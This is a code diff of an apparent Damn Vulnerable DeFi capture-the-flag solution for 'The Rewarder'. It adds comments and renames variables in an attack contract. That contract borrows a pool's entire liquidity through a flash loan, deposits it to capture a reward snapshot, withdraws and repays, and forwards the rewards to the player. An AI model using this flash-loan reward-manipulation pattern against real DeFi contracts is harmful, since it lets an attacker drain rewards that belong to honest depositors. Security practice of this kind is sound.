@@ -4,7 +4,6 @@ pragma solidity ^0.8.0;
 import { OwnableRoles } from "@solady/auth/OwnableRoles.sol";
 import { FixedPointMathLib } from "@solady/utils/FixedPointMathLib.sol";
 import { SafeTransferLib } from "@solady/utils/SafeTransferLib.sol";
-
 import { ERC20 } from "@openzeppelin/contracts-v4.7.1/token/ERC20/ERC20.sol";
 import { Address } from "@openzeppelin/contracts-v4.7.1/utils/Address.sol";
 import { ERC20Snapshot } from "@openzeppelin/contracts-v4.7.1/token/ERC20/extensions/ERC20Snapshot.sol";
@@ -158,6 +157,9 @@ contract TheRewarderPool {
 
         if (amountDeposited > 0 && totalDeposits > 0) {
             // @audit-issue doesn't take into consideration deposited time
+            /// @dev Returns `floor(x * y / d)`.
+            // (amountDeposited /totalDeposits)  * REWARDS
+
             rewards = amountDeposited.mulDiv(REWARDS, totalDeposits);
             if (rewards > 0 && !_hasRetrievedReward(msg.sender)) {
                 // @audit-issue no CEI
@@ -190,30 +192,30 @@ contract TheRewarderPool {
 contract TheRewarderHack {
     FlashLoanerPool private flashLoanPool;
     TheRewarderPool private pool;
-    DamnValuableToken private dvt;
+    DamnValuableToken private liquidityToken;
     RewardToken private reward;
     address internal player;
 
-    constructor(address _flashloan, address _pool, address _dvt, address _reward) {
+    constructor(address _flashloan, address _pool, address _liquidityToken, address _reward) {
         flashLoanPool = FlashLoanerPool(_flashloan);
         pool = TheRewarderPool(_pool);
-        dvt = DamnValuableToken(_dvt);
+        liquidityToken = DamnValuableToken(_liquidityToken);
         reward = RewardToken(_reward);
         player = msg.sender;
     }
 
     function attack() external {
-        flashLoanPool.flashLoan(dvt.balanceOf(address(flashLoanPool)));
+        flashLoanPool.flashLoan(liquidityToken.balanceOf(address(flashLoanPool)));
     }
 
     function receiveFlashLoan(uint256 amount) external {
-        dvt.approve(address(pool), amount);
+        liquidityToken.approve(address(pool), amount);
         // deposit liquidity token get reward token
         pool.deposit(amount);
         // withdraw liquidity token
         pool.withdraw(amount);
         // repay to flashloan
-        dvt.transfer(address(flashLoanPool), amount);
+        liquidityToken.transfer(address(flashLoanPool), amount);
         uint256 rewardBalance = reward.balanceOf(address(this));
         reward.transfer(player, rewardBalance);
     }
